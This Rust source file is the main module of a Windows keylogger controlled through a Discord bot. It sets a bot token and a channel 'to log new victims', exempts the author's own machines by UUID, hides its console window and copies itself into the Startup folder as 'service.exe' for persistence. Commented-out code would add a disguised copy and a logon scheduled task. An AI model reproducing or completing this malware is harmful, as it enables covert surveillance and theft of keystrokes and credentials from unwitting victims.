#![cfg(windows)]
#![allow(non_snake_case)]

// Discord bot token
const BOT_TOKEN: &str = "YOUR TOKEN";

// Channel id to log new victims
const LOGS_CHANNEL_ID: u64 = 0000000000;

// Protect computers with these UUIDs
const PROTECTED_UUIDS: &'static [&'static str] = &[
    "YOUR UUID",
];


extern crate dirs;
extern crate winapi;

mod klg;
mod bot;

use std::ptr;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::winuser::{ShowWindow, SW_HIDE};
use std::fs;
use std::env;
use winapi::shared::windef::HWND__;

/* TO USE LATER */
    // use std::process::Command;
    // use app_dirs::*;
    //
    // const APP_INFO: AppInfo = AppInfo{name: "service", author: "discord"};
    //
    // fn copy_to_discord() {
    //     let mut path;
    //     match app_root(AppDataType::UserConfig, &APP_INFO) {
    //         Ok(path_buf) => path = format!(r"{}\DiscordService.exe", String::from(path_buf.to_str().unwrap())),
    //         Err(_) => path = format!(r"{}\Inspector.exe", "C:/")
    //     }
    //
    //     let exe = String::from(env::current_exe().unwrap().to_str().unwrap());
    //
    //     match fs::copy(exe, path.clone()) {
    //         Ok(_) => add_to_schtasks(path),
    //         Err(_) => ()
    //     }
    // }
    //
    // fn add_to_schtasks(path: String) {
    //     let order = format!(
    //         "schtasks /create /F /SC ONLOGON /TN Discord /TR {}",
    //         path
    //     );
    //     let _ = Command::new("cmd").args(&["/C", &order]).output();
    // }

fn hide_console_window() { unsafe {
    let window: *mut HWND__ = GetConsoleWindow();

    if window != ptr::null_mut() {
        ShowWindow(window, SW_HIDE);
    }
} }

fn copy_to_startup() {
    let exe: String = String::from(env::current_exe().unwrap().to_str().unwrap());
    let path_to: String = format!(r"{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.exe", dirs::home_dir().unwrap().to_str().unwrap());
    if exe != path_to {
        let _ = fs::copy(exe, path_to);
    }
}


fn main() {
    /* TO USE LATER */
    // thread::spawn(|| {
    //
    //
    // });

    hide_console_window();
    copy_to_startup();
    bot::start();

}
